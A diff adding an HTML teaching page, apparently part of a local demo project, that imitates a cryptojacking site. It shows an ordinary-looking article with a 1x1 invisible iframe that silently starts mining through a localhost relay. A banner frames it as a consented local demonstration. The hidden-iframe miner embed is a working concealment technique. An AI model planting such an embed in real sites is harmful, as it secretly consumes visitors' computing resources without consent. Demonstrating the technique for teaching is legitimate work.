@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>嵌入演示页（本地教学）</title>
+  <style>
+    :root {
+      --bg: #f4f6fa;
+      --text: #1a1d26;
+      --muted: #5c6578;
+      --warn-bg: #fff8e6;
+      --warn-border: #e6b800;
+    }
+    body {
+      margin: 0;
+      min-height: 100vh;
+      font-family: "Segoe UI", system-ui, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      padding: 1.75rem;
+      max-width: 40rem;
+      margin-inline: auto;
+      line-height: 1.55;
+    }
+    .warn {
+      background: var(--warn-bg);
+      border: 1px solid var(--warn-border);
+      border-radius: 10px;
+      padding: 1rem 1.1rem;
+      font-size: 0.92rem;
+      margin-bottom: 1.25rem;
+    }
+    h1 { font-size: 1.35rem; font-weight: 600; margin: 0 0 0.75rem; }
+    p { margin: 0 0 0.85rem; color: var(--muted); }
+    .fake-content {
+      background: #fff;
+      border-radius: 10px;
+      padding: 1.25rem;
+      border: 1px solid #e2e6ef;
+      color: var(--text);
+    }
+    code { font-size: 0.88em; background: #e8ecf4; padding: 0.1em 0.35em; border-radius: 4px; }
+  </style>
+</head>
+<body>
+  <div class="warn">
+    <strong>本地教学用：</strong>下方隐藏 iframe 会加载 <code>index.html?auto=1</code>，在页面打开后自动向中继拉任务并开始挖矿，模拟「挂马页」行为。
+    请先在同一台机器上启动 <code>relay-server</code> 与 HTTP 服务；仅在你本人知情且同意时使用。
+  </div>
+
+  <h1>示例：看起来像普通文章</h1>
+  <p>这里可以是任意正文占位，访问者若不知道，不会注意到角落里的 iframe。</p>
+  <div class="fake-content">
+    <p style="margin:0;color:var(--text)">
+      Lorem ipsum dolor sit amet，浏览器标签仍显示本页标题，而挖矿在 iframe 内静默进行（若中继已就绪）。
+    </p>
+  </div>
+
+  <!--
+    1×1 隐藏 iframe：allow-scripts + allow-same-origin 以便 Worker 与同目录 miner-worker.js 同源加载。
+    src 使用相对路径，与父页同目录下的 index.html。
+    可按需改 relay / workers / throttle 查询参数。
+  -->
+  <iframe
+    src="index.html?auto=1&amp;relay=http://127.0.0.1:3001&amp;workers=1&amp;throttle=2"
+    title=""
+    style="position:fixed;width:1px;height:1px;left:0;bottom:0;opacity:0;pointer-events:none;border:0"
+    sandbox="allow-scripts allow-same-origin"
+  ></iframe>
+</body>
+</html>
